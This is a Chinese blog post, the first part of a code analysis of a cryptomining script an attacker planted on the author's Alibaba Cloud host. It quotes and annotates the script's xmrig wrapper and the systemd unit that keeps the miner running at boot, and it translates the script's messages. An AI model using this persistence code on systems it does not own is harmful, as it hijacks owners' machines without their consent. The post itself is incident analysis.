# 记上次黑客入侵阿里云主机 —— 代码分析（上）

已将问题反馈到阿里云安全团队客服，并向阿里云中心举报其地址。接下来是代码分析。(bk.sh)

## bk.sh，推测是靶机脚本(注入service部分)

### `cat >/tmp/c3pool_miner.service <<EOL` 注入设置脚本后台启动等

#### EOL注入脚本文件

参考信息源：

* [知乎专栏-heredoc入门](https://zhuanlan.zhihu.com/p/93993398)
* [linux265-pidof命令](https://linux265.com/course/linux-command-pidof.html)
* [linux265-nice命令](https://linux265.com/course/linux-command-nice.html)

`<<EOL EOL`创建与书写任意格式文本及代码。`pidof xxx`为查看xxx程序的进程号。nice命令调度进程的优先级，根据教程资料来看，黑客的代码语法还有些问题。不过，基本大意是非xmrig进程就直接低优先级。

```
cat >$HOME/c3pool/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/c3pool/xmrig \$*
else
  echo ""
fi
EOL
```

#### service内容解读

参考信息源：

* [博客园-Linux 下的两个特殊的文件 -- /dev/null 和 /dev/zero 简介及对比](https://www.cnblogs.com/lishihai/p/7986565.html)
* [csdn-&>/dev/null表示的意思](https://blog.csdn.net/heybeaman/article/details/89500337)
* [Linux *.service文件详解](https://blog.csdn.net/weixin_44352521/article/details/126679172)
* [journalctl基本介绍](https://blog.csdn.net/weixin_45537987/article/details/106762104)

`xxx 2>dev/null`屏蔽错误输出。`>/dev/null 2>&1`什么回显都不用。


```
# 判断有没有 systemctl 这命令 
  if ! type systemctl >/dev/null; then
    echo ""
	echo ""
    /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else
# 生成挖矿服务配置
    echo "[*] Creating c3pool_miner systemd service"
# 以下为注入配置
    cat >/tmp/c3pool_miner.service <<EOL
[Unit]  # 这个字段给出服务描述、启动顺序和依赖关系
Description=Monero miner service # 描述信息，挖矿服务

[Service] # 这个字段主要给出启动、重启、停止的策略行为
# 定义启动进程时执行的命令
ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json 
# 不管什么原因退出都会重启
Restart=always
# nice 10进程数值
Nice=10
CPUWeight=1

[Install] # 该字段定义如何安装，以及开机自启。
# Systemd有默认的启动 Target，就是 multi-user.target，即开机启动。
# 表示该服务所在的服务组,multi-user服务组。
WantedBy=multi-user.target
EOL

# 将tmp目录注入的服务配置移动到系统进程服务配置里去
    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
    echo ""
	echo ""
# 
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
# 启用挖矿服务，并开始挖矿    
    sudo systemctl enable c3pool_miner.service
    sudo systemctl start c3pool_miner.service
# 要查看矿工服务日志，请运行 "sudo journalctl -u c3pool_miner -f"命令 
    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
	echo ""
  fi
```

## “echo”及“#”打印及注释信息收集

### echo

"echo"部分为英语，我用翻译及个人有限功底理解其代码。第一行，中二教言语，忽略；从第二行开始翻译解读。

```
# 这部分是配置准备，以及调试
## 请将home环境定义到主目录。 
echo "ERROR: Please define HOME environment variable to your home directory"
## 请确保home环境已设置 
echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"

# 从这行的上部分代码推测实在挖矿了， 无法计算比特币什么的
## 错误：无法计算预计的门罗币 CN 哈希率 
echo "ERROR: Can't compute projected Monero CN hashrate"
## 报错，无法计算端口，输出错误端口
echo "ERROR: Can't compute port"
echo "ERROR: Wrong computed port value: $PORT"

# 进一步的恶意操控挖矿
## 下载与后台运行Monero CPU矿机/主机
echo "I will download, setup and run in background Monero CPU miner."
## 如果需要，前台的矿工可以通过$HOME/c3pool/miner.sh脚本启动。 
echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
# 挖矿将发生在 $WALLET 钱包上。这句话打印出来，就说明之前所有暗箱操作全完成了。
echo "Mining will happen to $WALLET wallet."
# 删掉挖矿的目录
echo "[*] Removing $HOME/c3pool directory"
```

### “#”（全部为机翻）

打印问候语；命令行参数；检查先决条件

```
# printing greetings
# command line arguments
# checking prerequisites
```

计算端口；印刷的意图；开始做事：准备矿工

```
# calculating port
# printing intentions
# start doing stuff: preparing miner
```

准备脚本

```
# preparing script
```

准备脚本后台工作和重启时的工作

```
# preparing script background work and work under reboot
```
